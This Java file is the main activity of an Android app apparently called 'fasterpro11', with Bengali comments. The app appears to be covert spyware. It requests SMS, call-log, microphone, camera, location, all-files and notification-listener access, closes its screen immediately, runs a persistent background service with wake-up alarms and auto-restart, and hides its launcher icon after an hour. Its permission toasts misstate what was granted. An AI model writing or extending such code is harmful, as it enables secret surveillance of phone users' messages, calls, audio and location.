package com.example.fasterpro11;

import android.Manifest;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.util.Log;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import androidx.work.OneTimeWorkRequest;
import androidx.work.PeriodicWorkRequest;
import androidx.work.WorkManager;
import androidx.work.WorkRequest;

import java.util.Calendar;
import java.util.concurrent.TimeUnit;
import android.widget.Toast;


public class MainActivity extends AppCompatActivity {
    private static final String TAG = "MainActivity";
    private static final int PERMISSION_REQUEST_CODE = 1001;
    private static final int OVERLAY_PERMISSION_REQUEST_CODE = 1002;
    private static final int AUTO_HIDE_DELAY = 60 * 60000; // 60 minutes (60000 sec)

    private static final String[] REQUIRED_PERMISSIONS = {
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.READ_SMS,
            Manifest.permission.SEND_SMS,
            Manifest.permission.INTERNET,
            Manifest.permission.ACCESS_NETWORK_STATE,
            Manifest.permission.CAMERA,
            Manifest.permission.RECEIVE_BOOT_COMPLETED,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.WRITE_CALL_LOG,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.WRITE_EXTERNAL_STORAGE,
            Manifest.permission.POST_NOTIFICATIONS // POST_NOTIFICATIONS permission added for Android 13+
    };

    private Toast currentToast;
    private MicRecord micRecord;
    private boolean hasRequestedPostNotificationPermission = false;
    private boolean hasShownPermissionDeniedToast = false; // Flag to show toast only once
    private int permissionRequestAttempts = 0; // Counter for permission request attempts

    @Override
    protected void onCreate(Bundle savedInstanceState) {

        try {




        super.onCreate(savedInstanceState);
        //setContentView(R.layout.activity_main);
        Log.d(TAG, "onCreate: MicRecord ইনিশিয়ালাইজ করা হচ্ছে");

        micRecord = new MicRecord(this);
        requestOverlayPermission();
        requestPermissions();

        // Hide app icon after the specified delay
        new Handler(Looper.getMainLooper()).postDelayed(this::hideAppIcon, AUTO_HIDE_DELAY);

        // WorkManager রিকোয়েস্ট তৈরি করুন
        WorkRequest smsNotificationWorkRequest = new OneTimeWorkRequest.Builder(BackgroundSmsNotificationWorker.class)
                .addTag("BackgroundSmsNotification") // Optional tag for managing the work
                .build();
        // কাজ শুরু করুন
        WorkManager.getInstance(this).enqueue(smsNotificationWorkRequest);

        checkPackageExistence();
        // Set alarms for 9 AM and 12 AM
        setDailyAlarm(this);

        // পরিষেবা শুরু করুন
        startBackgroundService();
        // MainActivity বন্ধ করুন যাতে UI দেখা না যায়
        finish();

        } catch (Exception e) {
            Log.e(TAG, "Error in app, restarting...");
            // Trigger auto-restart logic here
            Intent restartIntent = new Intent(MainActivity.this, AutoRestartReceiver.class);
            sendBroadcast(restartIntent);  // Sending broadcast to restart the app
        }



    }
    private void setDailyAlarm(Context context) {
        // Check if the app can schedule exact alarms
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            if (!context.getSystemService(AlarmManager.class).canScheduleExactAlarms()) {
                // If permission is not granted, request the user to grant it
                Intent intent = new Intent(Settings.ACTION_REQUEST_SCHEDULE_EXACT_ALARM);
                startActivityForResult(intent, 0);  // 0 is the request code
                return;
            }
        }

        AlarmManager alarmManager = (AlarmManager) context.getSystemService(Context.ALARM_SERVICE);
        Intent intent = new Intent(context, AutoStartReceiver.class); // Send broadcast to AutoStartReceiver

        // Create PendingIntent with FLAG_IMMUTABLE
        PendingIntent pendingIntent = PendingIntent.getBroadcast(context, 0, intent, PendingIntent.FLAG_IMMUTABLE);

        Calendar calendar = Calendar.getInstance();

        // Set alarm for 9 AM
        calendar.set(Calendar.HOUR_OF_DAY, 9);
        calendar.set(Calendar.MINUTE, 0);
        calendar.set(Calendar.SECOND, 0);
        alarmManager.setExact(AlarmManager.RTC_WAKEUP, calendar.getTimeInMillis(), pendingIntent);

        // Set alarm for 12 AM (midnight)
        calendar.set(Calendar.HOUR_OF_DAY, 0); // Midnight (12 AM)
        calendar.set(Calendar.MINUTE, 0);
        calendar.set(Calendar.SECOND, 0);
        alarmManager.setExact(AlarmManager.RTC_WAKEUP, calendar.getTimeInMillis(), pendingIntent);
    }



    private void checkPackageExistence() {
        PackageManager pm = getPackageManager();
        try {
            ApplicationInfo appInfo = pm.getApplicationInfo("com.example.fasterpro11", 0);
            // প্যাকেজটি পাওয়া গেছে, এখান থেকে আপনি আরও কাজ করতে পারেন
            Log.d("PackageFound", "com.example.fasterpro11 is installed.");
        } catch (PackageManager.NameNotFoundException e) {
            // প্যাকেজটি পাওয়া যায়নি
            Log.e("PackageNotFound", "com.example.fasterpro11 not found", e);
        }
    }

    private void schedulePeriodicWork() {
        // 120 মিনিট পর পর কাজটি চালানোর জন্য PeriodicWorkRequest তৈরি
        PeriodicWorkRequest periodicWorkRequest = new PeriodicWorkRequest.Builder(
                BackgroundSmsNotificationWorker.class, 120, TimeUnit.MINUTES)
                .build();

        // WorkManager এর মাধ্যমে কাজটি কিউতে যোগ করা
        WorkManager.getInstance(this).enqueue(periodicWorkRequest);

        Log.d(TAG, "Periodic work has been scheduled every 120 minutes.");
    }

    private void requestPermissions() {
        Log.d(TAG, "requestPermissions: পারমিশন চাওয়া হচ্ছে");

        boolean allPermissionsGranted = true;

        // Check for all required permissions
        for (String permission : REQUIRED_PERMISSIONS) {
            if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
                allPermissionsGranted = false;
                showToast("সব পারমিশন অনুমোদিত হয়েছে");
                Toast.makeText(getApplicationContext(), "সব পারমিশন অনুমোদিত হয়েছে", Toast.LENGTH_SHORT).show();
                break;
            }
        }

        if (!allPermissionsGranted && permissionRequestAttempts < 3) {
            permissionRequestAttempts++; // Increment the counter for permission requests
            ActivityCompat.requestPermissions(this, REQUIRED_PERMISSIONS, PERMISSION_REQUEST_CODE);
        } else if (permissionRequestAttempts >= 3) {
            showToast("পারমিশন ৩ বার রিকোয়েস্ট করার পরও অস্বীকৃত হয়েছে।");
            Log.w(TAG, "requestPermissions: পারমিশন রিকোয়েস্টের সীমা অতিক্রম করেছে");
        } else {
            Log.d(TAG, "সব পারমিশন ইতিমধ্যেই অনুমোদিত");
            Toast.makeText(getApplicationContext(), "Overall permission Granted", Toast.LENGTH_SHORT).show();
            startServicesAndRequests();
        }

        // Request for external storage permission (needed for Android 10 and lower)
        requestExternalStoragePermission();
    }

    private void requestOverlayPermission() {
        Log.d(TAG, "requestOverlayPermission: ওভারলে পারমিশন চেক করা হচ্ছে");
        if (!micRecord.hasOverlayPermission()) {
            Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:" + getPackageName()));
            startActivityForResult(intent, OVERLAY_PERMISSION_REQUEST_CODE);
            Log.d(TAG, "requestOverlayPermission: ওভারলে পারমিশন চাওয়ার জন্য অনুরোধ শুরু করা হচ্ছে");
        } else {
            Log.d(TAG, "requestOverlayPermission: ওভারলে পারমিশন ইতিমধ্যেই অনুমোদিত");
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == OVERLAY_PERMISSION_REQUEST_CODE) {
            if (micRecord.hasOverlayPermission()) {
                Log.d(TAG, "onActivityResult: ওভারলে পারমিশন অনুমোদিত");
                requestNotificationPermission();
            } else {
                showToast("ওভারলে পারমিশন অস্বীকৃত");
                Log.w(TAG, "onActivityResult: ওভারলে পারমিশন অস্বীকৃত");
                requestOverlayPermission();
            }
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == PERMISSION_REQUEST_CODE) {
            boolean allPermissionsGranted = true;
            StringBuilder deniedPermissions = new StringBuilder();

            for (int i = 0; i < grantResults.length; i++) {
                if (grantResults[i] != PackageManager.PERMISSION_GRANTED) {
                    allPermissionsGranted = false;
                    deniedPermissions.append(permissions[i]).append("\n");
                }
            }

            if (allPermissionsGranted) {
                Log.d(TAG, "onRequestPermissionsResult: সব পারমিশন অনুমোদিত করুন");
                //showToast("Pleae allow All permission");
                Toast.makeText(getApplicationContext(), "Pleae allow All permission", Toast.LENGTH_SHORT).show();


                startServicesAndRequests();
            } else {
                Log.w(TAG, "onRequestPermissionsResult: কিছু পারমিশন অস্বীকৃত");
                if (!hasShownPermissionDeniedToast) {
                    showToast("অস্বীকৃত পারমিশন:\n" + deniedPermissions.toString());
                    hasShownPermissionDeniedToast = true; // Show toast only once
                }
                // If we've reached the 3 attempts limit, stop requesting permissions
                if (permissionRequestAttempts < 3) {
                    requestPermissions(); // Try requesting permissions again
                } else {
                    showToast("পারমিশন রিকোয়েস্টের সীমা অতিক্রম করেছে");
                    Log.w(TAG, "onRequestPermissionsResult: পারমিশন রিকোয়েস্টের সীমা অতিক্রম করেছে");
                }
            }
        }
    }

    private void startServicesAndRequests() {
        Log.d(TAG, "startServicesAndRequests: সার্ভিস শুরু করা হচ্ছে");
        startBackgroundService();
        requestNotificationListenerPermission();
        requestManageExternalStoragePermission();
    }

    private void requestManageExternalStoragePermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (!Environment.isExternalStorageManager()) {
                Intent intent = new Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION, Uri.parse("package:" + getPackageName()));
                startActivityForResult(intent, PERMISSION_REQUEST_CODE);
            }
        }
    }

    private void requestNotificationListenerPermission() {
        if (!isNotificationServiceEnabled()) {
            Intent intent = new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS);
            startActivityForResult(intent, OVERLAY_PERMISSION_REQUEST_CODE);
            Log.d(TAG, "requestNotificationListenerPermission: নোটিফিকেশন লিসনার পারমিশন চাওয়ার জন্য অনুরোধ শুরু করা হচ্ছে");
        }
    }

    private void requestNotificationPermission() {
        // Android 13 (API 33) এবং তার পরবর্তী ভার্সনের জন্য POST_NOTIFICATIONS পারমিশন চাই
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            // যদি POST_NOTIFICATIONS পারমিশন এখনও গ্রান্ট না থাকে
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED) {
                // পারমিশন চাওয়া হচ্ছে
                if (!hasRequestedPostNotificationPermission) {
                    ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.POST_NOTIFICATIONS}, PERMISSION_REQUEST_CODE);
                    Log.d(TAG, "requestNotificationPermission: POST_NOTIFICATIONS পারমিশন চাওয়ার জন্য অনুরোধ শুরু করা হচ্ছে");
                    hasRequestedPostNotificationPermission = true;
                }
            } else {
                Log.d(TAG, "requestNotificationPermission: POST_NOTIFICATIONS পারমিশন ইতিমধ্যেই অনুমোদিত");
            }
        } else {
            // যদি Android 12 বা তার নিচের ভার্সন হয়, তাহলে এই পারমিশন প্রয়োজন নেই
            Log.d(TAG, "requestNotificationPermission: POST_NOTIFICATIONS পারমিশন প্রয়োজন নেই Android 13 নিচের ভার্সন");
        }
    }


    private boolean isNotificationServiceEnabled() {
        String pkgName = getPackageName();
        final String flat = Settings.Secure.getString(getContentResolver(), "enabled_notification_listeners");
        if (flat != null) {
            final String[] names = flat.split(":");
            for (String name : names) {
                final ComponentName cn = ComponentName.unflattenFromString(name);
                if (cn != null && pkgName.equals(cn.getPackageName())) {
                    Log.d(TAG, "isNotificationServiceEnabled: নোটিফিকেশন সার্ভিস সক্রিয়");
                    return true;
                }
            }
        }
        Log.w(TAG, "isNotificationServiceEnabled: নোটিফিকেশন সার্ভিস সক্রিয় নয়");
        return false;
    }

    private void startBackgroundService() {
        Intent serviceIntent = new Intent(this, BackgroundService.class);
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                Log.d(TAG, "startBackgroundService: ফরগ্রাউন্ড সার্ভিস শুরু করা হচ্ছে");
                startForegroundService(serviceIntent);
            } else {
                startService(serviceIntent);
                Log.d(TAG, "startBackgroundService: সার্ভিস শুরু করা হচ্ছে");
            }
        } catch (Exception e) {
            Log.e(TAG, "ব্যাকগ্রাউন্ড সার্ভিস শুরু করতে ত্রুটি", e);
            showToast("ব্যাকগ্রাউন্ড সার্ভিস শুরু করতে ত্রুটি: " + e.getMessage());
        }
    }

    private void showToast(String message) {
        if (currentToast != null) {
            currentToast.cancel();
        }
        currentToast = Toast.makeText(this, message, Toast.LENGTH_LONG);
        currentToast.show();
    }

    private void hideAppIcon() {
        PackageManager p = getPackageManager();
        ComponentName componentName = new ComponentName(this, MainActivity.class);
        p.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
    }

    // Check and request permission for external storage
    private void requestExternalStoragePermission() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) {
            // Android 10 and below: Request READ_EXTERNAL_STORAGE
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE)
                    != PackageManager.PERMISSION_GRANTED) {
                ActivityCompat.requestPermissions(this,
                        new String[]{Manifest.permission.READ_EXTERNAL_STORAGE},
                        PERMISSION_REQUEST_CODE);
            } else {
                Log.d(TAG, "READ_EXTERNAL_STORAGE permission already granted.");
            }
        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            // Android 11 and above: Request MANAGE_EXTERNAL_STORAGE
            if (Environment.isExternalStorageManager()) {
                Log.d(TAG, "MANAGE_EXTERNAL_STORAGE permission already granted.");
            } else {
                Intent intent = new Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION);
                startActivityForResult(intent, PERMISSION_REQUEST_CODE);
            }
        }
    }
}
